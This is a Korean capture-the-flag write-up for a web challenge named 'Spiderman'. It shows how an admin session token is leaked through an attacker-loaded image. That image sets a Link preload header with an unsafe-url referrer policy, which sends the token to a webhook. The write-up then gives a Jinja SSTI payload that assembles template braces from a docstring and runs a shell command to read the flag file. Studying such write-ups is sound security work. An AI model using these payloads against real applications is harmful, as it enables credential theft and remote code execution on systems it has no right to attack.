# Spiderman

# Usage

-

# Concept

- [Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy)
- SSTI

# Writeup

1. Leak admin credential

```jinja
<script>
    let DEFAUL_IMG_URL;
    {% if user.image_url %}
    DEFAUL_IMG_URL = "{{ user.image_url }}";
    {% else %}
    DEFAUL_IMG_URL = "/static/image/spiderman.jpg";
    {% endif %}
</script>
<script src="/static/js/profile.js"></script>
```

`user.image_url`을 DEFAULT_IMG_URL로 설정해줍니다.

```
// profile.js
const imageDisplay = document.getElementById('imageDisplay');
const urlSearch = new URLSearchParams(location.search);
const imgPath = urlSearch.get('imageDisplay') ?? DEFAUL_IMG_URL;
const imgSrc = new URL(imgPath, location.origin);
imageDisplay.src = imgSrc;
```

`imgSrc`를 `new URL(imgPath, location.origin)`으로 가져옵니다.

base가 설정되어있지만 imgPath를 `//example.com`과 같이하여 임의의 이미지를 로딩할 수 있습니다.

credential은 파라미터에 `?session={}`으로 존재합니다.

```py
response.headers['Referrer-Policy'] = 'no-referrer'
```

app.py를 보면 Referrer-Policy가 no-referrer로 설정되어 있기 때문에 우회가 필요합니다.

5월 6일에 `slonser`가 X에 이를 우회하는 잘 알려지지 않은 방법을 포스팅했습니다.

https://x.com/slonser_/status/1919439377295413485

[mdn - Link](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Link)

```
Link: <uri-reference>; param1=value1; param2="value2"
```

```
Link: <WEBHOOK>; rel="preload"; as="image"; referrerpolicy="unsafe-url"
```

이미지에서 response에 Link header를 설정하여 위와 같이 credential을 유출시킬 수 있습니다.

2. SSTI

```
ssti={user.hash_password.__doc__[13]}{user.hash_password.__doc__[13]}7*7{user.hash_password.__doc__[30]}{user.hash_password.__doc__[30]}
```

```py
@staticmethod
def hash_password(password):
    """
        {{super mega hash}}
    """
    return hashlib.sha256(password.encode()).hexdigest()
```

**doc**로 들어가게 되어서 로직상 아래와 같이 SSTI를 일으킬 수 있습니다.

```
ssti={user.hash_password.__doc__[13]}{user.hash_password.__doc__[13]}request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read(){user.hash_password.__doc__[30]}{user.hash_password.__doc__[30]}
```
